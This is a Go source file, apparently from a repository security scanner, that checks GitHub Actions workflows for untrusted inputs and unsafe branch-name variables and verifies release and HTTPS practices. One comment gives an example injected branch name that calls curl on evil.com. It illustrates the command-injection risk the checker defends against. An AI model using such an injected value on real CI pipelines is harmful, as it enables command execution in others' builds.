package build_release

import (
	"encoding/base64"
	"fmt"
	"regexp"
	"strings"

	"github.com/gemaraproj/go-gemara"
	"github.com/ossf/si-tooling/v2/si"
	"github.com/rhysd/actionlint"

	"github.com/ossf/pvtr-github-repo-scanner/data"
	"github.com/ossf/pvtr-github-repo-scanner/evaluation_plans/reusable_steps"
)

// Pre-compiled patterns used by workflow security checks.
var (
	// https://securitylab.github.com/resources/github-actions-untrusted-input/
	// List of untrusted inputs; Global for use in tests also
	untrustedVars = regexp.MustCompile(`.*(github\.event\.issue\.title|` +
		`github\.event\.issue\.body|` +
		`github\.event\.pull_request\.title|` +
		`github\.event\.pull_request\.body|` +
		`github\.event\.comment\.body|` +
		`github\.event\.review\.body|` +
		`github\.event\.pages.*\.page_name|` +
		`github\.event\.commits.*\.message|` +
		`github\.event\.head_commit\.message|` +
		`github\.event\.head_commit\.author\.email|` +
		`github\.event\.head_commit\.author\.name|` +
		`github\.event\.commits.*\.author\.email|` +
		`github\.event\.commits.*\.author\.name|` +
		`github\.event\.pull_request\.head\.ref|` +
		`github\.event\.pull_request\.head\.label|` +
		`github\.event\.pull_request\.head\.repo\.default_branch|` +
		`github\.head_ref).*`)

	// Branch name variables that could be used unsafely in workflow run steps.
	// These are attacker-controllable when a PR is opened from a fork.
	// When used directly in a run: step, GitHub textually injects the branch name
	// into the shell script before execution, allowing command injection via
	// a malicious branch name (e.g. a branch named: feature"; curl evil.com; echo ").
	alwaysUnsafeBranchVars = regexp.MustCompile(`.*(github\.head_ref|` +
		`github\.base_ref|` +
		`github\.event\.pull_request\.head\.ref|` +
		`github\.event\.pull_request\.base\.ref).*`)

	// Branch ref variables that are only attacker-controllable in
	// pull_request-triggered workflows. Checked separately so we can
	// skip them for push-triggered workflows and avoid false positives.
	pullRequestOnlyUnsafeBranchVars = regexp.MustCompile(`.*(github\.ref\b|` +
		`github\.ref_name).*`)
)

// checkAllWorkflows verifies the payload, iterates over all workflow files, and
// applies checkWorkflow to each parsed workflow. passMessage is returned when all files pass.
func checkAllWorkflows(payloadData any, checkWorkflow func(*actionlint.Workflow) (bool, string), passMessage string) (gemara.Result, string, gemara.ConfidenceLevel) {
	var confidence gemara.ConfidenceLevel

	data, message := reusable_steps.VerifyPayload(payloadData)
	if message != "" {
		return gemara.Unknown, message, confidence
	}
	workflows, err := data.GetDirectoryContent(".github/workflows")
	if len(workflows) == 0 {
		if err != nil {
			message = err.Error()
		} else {
			message = "No workflows found in .github/workflows directory"
		}
		return gemara.NotApplicable, message, confidence
	}

	for _, file := range workflows {
		if !strings.HasSuffix(*file.Name, ".yml") && !strings.HasSuffix(*file.Name, ".yaml") {
			continue
		}

		if *file.Encoding != "base64" {
			return gemara.Failed, fmt.Sprintf("File %v is not base64 encoded", file.Name), confidence
		}

		decoded, err := base64.StdEncoding.DecodeString(*file.Content)
		if err != nil {
			return gemara.Failed, fmt.Sprintf("Error decoding workflow file: %v", err), confidence
		}

		workflow, actionError := actionlint.Parse(decoded)
		if actionError != nil {
			return gemara.Failed, fmt.Sprintf("Error parsing workflow: %v (%s)", actionError, *file.Path), confidence
		}

		ok, message := checkWorkflow(workflow)
		if !ok {
			return gemara.Failed, message, confidence
		}
	}

	return gemara.Passed, passMessage, confidence
}

func CicdSanitizedInputParameters(payloadData any) (gemara.Result, string, gemara.ConfidenceLevel) {
	return checkAllWorkflows(payloadData, checkWorkflowFileForUntrustedInputs,
		"GitHub Workflows variables do not contain untrusted inputs")
}

func CicdBranchNameSanitized(payloadData any) (gemara.Result, string, gemara.ConfidenceLevel) {
	return checkAllWorkflows(payloadData, checkWorkflowFileForBranchNameUsage,
		"GitHub Workflows do not use unsanitized branch names in run steps")
}

// checkWorkflowFileForBranchNameUsage checks a workflow for unsanitized branch name
// variables used directly in run: steps, which can lead to command injection.
// It applies two levels of checking:
//   - alwaysUnsafeBranchVars: flagged regardless of trigger type (e.g. github.head_ref)
//   - pullRequestOnlyUnsafeBranchVars: only flagged when the workflow has a
//     pull_request or pull_request_target trigger (e.g. github.ref, github.ref_name)
func checkWorkflowFileForBranchNameUsage(workflow *actionlint.Workflow) (bool, string) {

	// Determine if the workflow is triggered by pull request events,
	// which makes github.ref and github.ref_name attacker-controllable.
	hasPullRequestTrigger := false
	for _, event := range workflow.On {
		if event.EventName() == "pull_request" || event.EventName() == "pull_request_target" {
			hasPullRequestTrigger = true
			break
		}
	}

	var message strings.Builder

	for _, job := range workflow.Jobs {
		if job == nil {
			continue
		}

		for _, step := range job.Steps {
			if step == nil {
				continue
			}

			run, ok := step.Exec.(*actionlint.ExecRun)
			if !ok || run.Run == nil {
				continue
			}

			varList := pullVariablesFromScript(run.Run.Value)

			for _, name := range varList {
				nameBytes := []byte(name)
				if alwaysUnsafeBranchVars.Match(nameBytes) {
					fmt.Fprintf(&message, "Unsanitized branch name variable found: %v\n", name)
				} else if hasPullRequestTrigger && pullRequestOnlyUnsafeBranchVars.Match(nameBytes) {
					fmt.Fprintf(&message, "Attacker-controllable ref variable in pull_request workflow: %v\n", name)
				}
			}
		}
	}

	if message.Len() > 0 {
		return false, message.String()
	}
	return true, ""
}

// checkWorkflowFileForUntrustedInputs checks a workflow for known untrusted
// GitHub Actions context variables used directly in run: steps.
// These variables (e.g. issue titles, PR bodies, commit messages) are
// user-controllable and can lead to command injection when interpolated
// into shell scripts without sanitization.
func checkWorkflowFileForUntrustedInputs(workflow *actionlint.Workflow) (bool, string) {

	var message strings.Builder

	for _, job := range workflow.Jobs {
		if job == nil {
			continue
		}

		for _, step := range job.Steps {
			if step == nil {
				continue
			}

			// Only run: steps are vulnerable; action steps use inputs safely.
			run, ok := step.Exec.(*actionlint.ExecRun)
			if !ok || run.Run == nil {
				continue
			}

			// Extract all ${{ ... }} expressions and check against known untrusted inputs.
			varList := pullVariablesFromScript(run.Run.Value)

			for _, name := range varList {
				if untrustedVars.Match([]byte(name)) {
					fmt.Fprintf(&message, "Untrusted input found: %v\n", name)
				}
			}
		}
	}

	if message.Len() > 0 {
		return false, message.String()
	}
	return true, ""

}

// pullVariablesFromScript extracts GitHub Actions expression names from a shell script.
// It finds all ${{ ... }} interpolations and returns the trimmed variable names.
// For example, given `echo ${{ github.head_ref }}`, it returns ["github.head_ref"].
func pullVariablesFromScript(script string) []string {

	varlist := []string{}

	for {

		start := strings.Index(script, "${{")
		if start == -1 {
			break
		}

		end := strings.Index(script[start:], "}}")
		if end == -1 {
			return nil
		}

		varlist = append(varlist, strings.TrimSpace(script[start+3:start+end]))

		script = script[start+end:]

	}

	return varlist

}

func ReleaseHasUniqueIdentifier(payloadData any) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
	data, message := reusable_steps.VerifyPayload(payloadData)
	if message != "" {
		return gemara.Unknown, message, confidence
	}

	var noNameCount int
	var sameNameFound []string
	var releaseNames = make(map[string]int)

	for _, release := range data.Releases {
		if release.Name == "" {
			noNameCount++
		} else if _, ok := releaseNames[release.Name]; ok {
			sameNameFound = append(sameNameFound, release.Name)
		} else {
			releaseNames[release.Name] = release.Id
		}
	}
	if noNameCount > 0 || len(sameNameFound) > 0 {
		sameNames := strings.Join(sameNameFound, ", ")
		message := []string{fmt.Sprintf("Found %v releases with no name", noNameCount)}
		if len(sameNameFound) > 0 {
			message = append(message, fmt.Sprintf("Found %v releases with the same name: %v", len(sameNameFound), sameNames))
		}
		return gemara.Failed, strings.Join(message, ". "), confidence
	}
	return gemara.Passed, "All releases found have a unique name", confidence
}

func getLinks(data data.Payload) []string {
	ins := data.Insights
	var links []string

	addURL := func(u si.URL) { links = append(links, string(u)) }
	addURLPtr := func(u *si.URL) {
		if u != nil {
			links = append(links, string(*u))
		}
	}

	addURL(ins.Header.URL)
	addURLPtr(ins.Header.ProjectSISource)
	addURLPtr(ins.Project.HomePage)
	addURLPtr(ins.Project.Roadmap)
	addURLPtr(ins.Project.Funding)
	addURLPtr(ins.Project.Documentation.DetailedGuide)
	addURLPtr(ins.Project.Documentation.CodeOfConduct)
	addURLPtr(ins.Project.Documentation.QuickstartGuide)
	addURLPtr(ins.Project.Documentation.ReleaseProcess)
	addURLPtr(ins.Project.Documentation.SignatureVerification)
	addURLPtr(ins.Project.VulnerabilityReporting.BugBountyProgram)
	addURLPtr(ins.Project.VulnerabilityReporting.Policy)
	addURL(ins.Repository.Url)
	addURL(ins.Repository.License.Url)
	addURLPtr(ins.Repository.SecurityPosture.Assessments.Self.Evidence)

	if data.RepositoryMetadata.OrganizationBlogURL() != nil {
		links = append(links, *data.RepositoryMetadata.OrganizationBlogURL())
	}
	for _, repo := range ins.Project.Repositories {
		addURL(repo.Url)
	}
	for _, assessment := range ins.Repository.SecurityPosture.Assessments.ThirdPartyAssessment {
		addURLPtr(assessment.Evidence)
	}
	for _, tool := range ins.Repository.SecurityPosture.Tools {
		if tool.Results.Adhoc != nil {
			addURL(tool.Results.Adhoc.Location)
		}
		if tool.Results.CI != nil {
			addURL(tool.Results.CI.Location)
		}
		if tool.Results.Release != nil {
			addURL(tool.Results.Release.Location)
		}
	}
	return links
}

func insecureURI(uri string) bool {
	if strings.TrimSpace(uri) == "" ||
		strings.HasPrefix(uri, "https://") ||
		strings.HasPrefix(uri, "ssh:") ||
		strings.HasPrefix(uri, "git:") ||
		strings.HasPrefix(uri, "git@") {
		return false
	}
	return true
}

func EnsureInsightsLinksUseHTTPS(payloadData any) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
	data, message := reusable_steps.VerifyPayload(payloadData)
	if message != "" {
		return gemara.Unknown, message, confidence
	}

	links := getLinks(data)
	var badURIs []string
	for _, link := range links {
		if insecureURI(link) {
			badURIs = append(badURIs, link)
		}
	}
	if len(badURIs) > 0 {
		return gemara.Failed, fmt.Sprintf("The following links do not use HTTPS: %v", strings.Join(badURIs, ", ")), confidence
	}
	return gemara.Passed, "All links use HTTPS", confidence
}

func EnsureLatestReleaseHasChangelog(payloadData any) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
	data, message := reusable_steps.VerifyPayload(payloadData)
	if message != "" {
		return gemara.Unknown, message, confidence
	}

	releaseDescription := data.Repository.LatestRelease.Description
	if strings.Contains(releaseDescription, "Change Log") || strings.Contains(releaseDescription, "Changelog") {
		return gemara.Passed, "Mention of a changelog found in the latest release", confidence
	}
	return gemara.Failed, "The latest release does not have mention of a changelog: \n" + releaseDescription, confidence
}

func InsightsHasSlsaAttestation(payloadData any) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
	data, message := reusable_steps.VerifyPayload(payloadData)
	if message != "" {
		return gemara.Unknown, message, confidence
	}

	attestations := data.Insights.Repository.ReleaseDetails.Attestations

	for _, attestation := range attestations {
		if attestation.PredicateURI == "https://slsa.dev/provenance/v1" {
			return gemara.Passed, "Found SLSA attestation in security insights", confidence
		}
	}
	return gemara.Failed, "No SLSA attestation found in security insights", confidence
}

func DistributionPointsUseHTTPS(payloadData any) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
	data, message := reusable_steps.VerifyPayload(payloadData)
	if message != "" {
		return gemara.Unknown, message, confidence
	}

	distributionPoints := data.Insights.Repository.ReleaseDetails.DistributionPoints

	if len(distributionPoints) == 0 {
		return gemara.NotApplicable, "No official distribution points found in Security Insights data", confidence
	}

	var badURIs []string
	for _, point := range distributionPoints {
		if insecureURI(point.Uri) {
			badURIs = append(badURIs, point.Uri)
		}
	}
	if len(badURIs) > 0 {
		return gemara.Failed, fmt.Sprintf("The following distribution points do not use HTTPS: %v", strings.Join(badURIs, ", ")), confidence
	}
	return gemara.Passed, "All distribution points use HTTPS", confidence
}

func SecretScanningInUse(payloadData any) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
	data, message := reusable_steps.VerifyPayload(payloadData)
	if message != "" {
		return gemara.Unknown, message, confidence
	}

	if data.SecurityPosture.PreventsPushingSecrets() && data.SecurityPosture.ScansForSecrets() {
		return gemara.Passed, "Secret scanning is enabled and prevents pushing secrets", confidence
	} else if data.SecurityPosture.PreventsPushingSecrets() || data.SecurityPosture.ScansForSecrets() {
		return gemara.Failed, "Secret scanning is only partially enabled", confidence
	} else {
		return gemara.Failed, "Secret scanning is not enabled", confidence
	}
}
